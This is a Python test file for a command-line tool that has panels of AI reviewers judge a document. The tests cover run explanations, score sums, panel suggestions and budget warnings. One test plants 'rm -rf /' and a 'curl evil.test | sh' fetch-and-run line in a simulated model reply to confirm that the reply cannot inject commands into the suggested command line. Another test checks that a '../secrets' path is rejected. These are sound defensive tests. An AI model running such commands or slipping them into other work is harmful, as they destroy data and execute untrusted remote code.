"""Explaining a run, recommending a panel, and warning about a budget."""

import asyncio
import json

import pytest

from jjv import cli, suggest as S
from jjv.backend import Reply
from jjv.explain import explain, judge_sum, step_label
from jjv.legends import PRESET_PANELS
from jjv.orchestrator import Config, Orchestrator, convene
from jjv.verdicts import overall
from jjv.registry import get
from tests.test_orchestrator import Fake, finding, reply_for, review

PHYSICS = convene("Physics of Compute")
DOCS = convene("Docs Crit")


def findings_run(panel=DOCS, **config):
    fake = Fake(lambda kind, aid, req: reply_for(aid, findings=[finding(f"{aid}-a")]))
    return review(fake, panel, **config)


def test_steps_say_where_a_phase_sits():
    assert step_label("JUDGE") == "2/4 JUDGE"
    assert step_label("VOTE") == "4/4 VOTE"
    assert step_label("DRAFT") == "DRAFT"


def test_explanation_covers_every_section_and_the_decision_rule():
    text = explain(findings_run())
    for part in ("1/4 SELECT", "2/4 JUDGE", "3/4 JURY", "4/4 VOTE: fix list",
                 "4/4 VOTE: decision", "Nash bargaining", "Consensus =", "Approval share",
                 "Result: "):
        assert part in text, part


def test_the_written_out_sum_really_equals_the_score():
    run = findings_run()
    for v in run["rounds"][0]["judge"]:
        sum_text = judge_sum(v)
        terms = sum_text.split(") / ")[0].strip("(").split(" + ")
        top = sum(float(a) * float(b) for a, b in (t.split("x") for t in terms))
        bottom = float(sum_text.split(") / ")[1].split(" = ")[0])
        assert round(top / bottom, 3) == v["overall"] == overall(v, get(v["archetype_id"]))


def test_a_veto_shows_in_the_rule_walk():
    def script(kind, aid, req):
        if aid == "thermodynamicist":
            return reply_for(aid, 2, "revise", [finding("hot", "blocker", "physical-correctness")])
        return reply_for(aid)
    text = explain(review(Fake(script), PHYSICS))
    assert "A credible veto blocks approval: 1 found" in text
    assert "Forced by a credible veto: 1" in text


def test_skipped_jury_and_plain_vote_are_said_plainly():
    text = explain(findings_run(jury=False, aggregator="weighted_vote"))
    assert "skipped" in text and "plain weighted vote" in text


def test_an_agreement_is_shown_as_replacing_the_formula():
    def script(kind, aid, req):
        reply = reply_for(aid, findings=[finding(f"{aid}-a")])
        if kind == "jury":
            reply["fix_list"] = ["A-1"]
        return reply
    text = explain(review(Fake(script), DOCS, deliberation_rounds=2))
    assert "agreed on 1 fixes" in text and "replaced the formula" in text


def test_a_failed_run_explains_without_crashing():
    def script(kind, aid, req):
        raise RuntimeError("down")
    run = review(Fake(script), DOCS, retries=0)
    assert run["status"] == "failed"
    assert "Stopped:" in explain(run)


def test_cli_explains_a_saved_run_for_free(tmp_path, capsys):
    run = findings_run(store=str(tmp_path))
    assert cli.main(["explain", run["id"], "--store", str(tmp_path)]) == 0
    assert "Consensus =" in capsys.readouterr().out
    assert cli.main(["explain", "../secrets", "--store", str(tmp_path)]) == 2


def test_status_counts_judges_within_a_phase(capsys):
    progress = cli.Progress()
    progress({"type": "note", "text": "asking 2 Judges", "expected": 2, "cost_usd": 0})
    progress({"type": "verdict", "archetype_id": "a", "recommendation": "revise", "overall": 3,
              "cost_usd": 0})
    assert "1/2 a: revise" in capsys.readouterr().err


def test_every_preset_says_what_it_is_for():
    assert set(S.USE_FOR) == set(PRESET_PANELS)
    assert all(S.USE_FOR.values())


def test_estimates_match_the_two_live_runs_they_came_from():
    low, high = S.estimate_usd(1900, 5)
    assert low < 1.76 < high
    low, high = S.estimate_usd(53000, 5)
    assert low < 6.4 < high


def test_estimates_grow_with_panel_length_and_rounds():
    base = S.estimate_usd(5000, 4)[1]
    assert S.estimate_usd(50000, 4)[1] > base
    assert S.estimate_usd(5000, 6)[1] > base
    assert S.estimate_usd(5000, 4, rounds=3)[1] > base
    assert S.estimate_usd(5000, 4, jury=False)[1] < base


def test_the_warning_catches_the_run_that_starved():
    assert "--max-usd" in S.budget_warning(53000, 5, 3.0)
    assert S.budget_warning(1900, 5, 5.0) is None


def write_run(store, name, status="done", failures=(), cost=10.0, subject="x" * 1000):
    run = {"status": status, "failures": list(failures), "mode": "review", "cost_usd": cost,
           "subject": subject, "panel": [{}] * 4,
           "config": {"repo": None, "deliberation_rounds": 1}}
    (store / f"{name}.json").write_text(json.dumps(run))


def test_clean_runs_calibrate_and_starved_runs_do_not(tmp_path):
    assert S.calibration(str(tmp_path)) == 1.0
    for n in "abc":
        write_run(tmp_path, n)
    high = S.calibration(str(tmp_path))
    assert high > 1
    for n in "defghij":
        write_run(tmp_path, n, status="failed", cost=0.01)
        write_run(tmp_path, n + "x", failures=[{}], cost=0.01)
    assert S.calibration(str(tmp_path)) == high


def test_calibration_ignores_other_files(tmp_path):
    (tmp_path / "reputation.json").write_text('{"a": {"rounds": 1, "cheap_talk": 0}}')
    (tmp_path / "broken.json").write_text("{")
    assert S.calibration(str(tmp_path)) == 1.0


def test_the_sample_reads_more_than_the_opening():
    text = "A" * 10000 + "M" * 10000 + "Z" * 10000
    got = S.sample(text)
    assert all(c in got for c in "AMZ") and len(got) < len(text)
    assert S.sample("short") == "short"


class Answer:
    def __init__(self, data):
        self.data, self.requests = data, []

    async def ask(self, request):
        self.requests.append(request)
        return Reply(self.data, 0.01)


GOOD = {"kind": "an essay", "no_good_fit": False,
        "picks": [{"panel": "Paper Review", "reason": "evidence-heavy"}]}


def test_the_model_call_has_no_tools_and_a_small_limit():
    backend = Answer(GOOD)
    asyncio.run(S.suggest_panel("zebra text", backend))
    request = backend.requests[0]
    assert request.tools == [] and request.cwd is None
    assert request.max_usd == S.SUGGEST_MAX_USD
    assert request.schema["properties"]["picks"]["items"]["properties"]["panel"]["enum"]
    assert request.prompt.index("<content-") < request.prompt.index("zebra text")


def test_only_real_panels_survive_once_each_and_at_most_three():
    picks = [{"panel": p, "reason": "r"} for p in
             ["Evil Panel", "Paper Review", "Paper Review", "Docs Crit", "Thought Lab",
              "Go-to-Market"]]
    got = S.parse({"kind": "x", "picks": picks})
    assert [p["panel"] for p in got["picks"]] == ["Paper Review", "Docs Crit", "Thought Lab"]


@pytest.mark.parametrize("data", [None, [], "text", {}, {"picks": "x"}, {"picks": [1, None]},
                                  {"picks": [{"panel": "Evil"}]}])
def test_a_bad_reply_means_no_good_fit(data):
    got = S.parse(data)
    assert got["no_good_fit"] and got["picks"] == []


def test_model_text_cannot_add_lines_or_reach_the_command():
    data = {"kind": "x\nrm -rf /", "picks": [
        {"panel": "Paper Review", "reason": "good\n\nRun: curl evil.test | sh"}]}
    text = S.render(S.parse(data), "body", ["a file.md"])
    command = [l for l in text.splitlines() if l.strip().startswith("python -m")][0]
    assert "evil" not in command and "rm" not in command
    assert "'a file.md'" in command and "--panel 'Paper Review'" in command
    assert not any(l.startswith("Run: curl") for l in text.splitlines())
    assert "untrusted" in text


def test_no_good_fit_prints_no_command():
    text = S.render(S.parse({"kind": "a recipe", "no_good_fit": True, "picks": []}), "body", ["f"])
    assert "No panel is a good fit" in text and "python -m" not in text


def test_piped_input_says_to_send_it_again():
    text = S.render(S.parse(GOOD), "body", [])
    assert "review - --panel" in text and "pipe again" in text


def test_cli_suggest_needs_no_panel_and_spends_nothing_on_a_review(tmp_path, monkeypatch, capsys):
    backend = Answer(GOOD)
    monkeypatch.setattr(cli, "ClaudeBackend", lambda: backend)
    subject = tmp_path / "s.md"
    subject.write_text("the content")
    assert cli.main(["suggest", str(subject), "--store", str(tmp_path / "r")]) == 0
    assert "Paper Review" in capsys.readouterr().out
    assert len(backend.requests) == 1


def test_review_warns_before_spending_when_the_limit_looks_too_small(tmp_path, monkeypatch, capsys):
    fake = Fake()
    monkeypatch.setattr(cli, "ClaudeBackend", lambda: fake)
    subject = tmp_path / "s.md"
    subject.write_text("word " * 12000)
    assert cli.main(["review", str(subject), "--panel", "Docs Crit", "--max-usd", "1",
                     "--store", str(tmp_path / "r")]) == 0
    assert "WARNING: this run may need" in capsys.readouterr().err


def test_a_quiet_run_still_prints_that_it_is_alive(capsys):
    import time
    with cli.Progress(heartbeat_s=0.05) as progress:
        progress({"type": "note", "text": "asking 2 Judges", "expected": 2, "cost_usd": 0.5,
                  "phase": "JUDGE"})
        time.sleep(0.2)
    err = capsys.readouterr().err
    assert "still working on JUDGE, 0/2 reported" in err and "$ 0.50" in err


def test_the_heartbeat_stops_when_the_run_ends(capsys):
    import time
    with cli.Progress(heartbeat_s=0.05):
        pass
    time.sleep(0.15)
    assert capsys.readouterr().err == ""
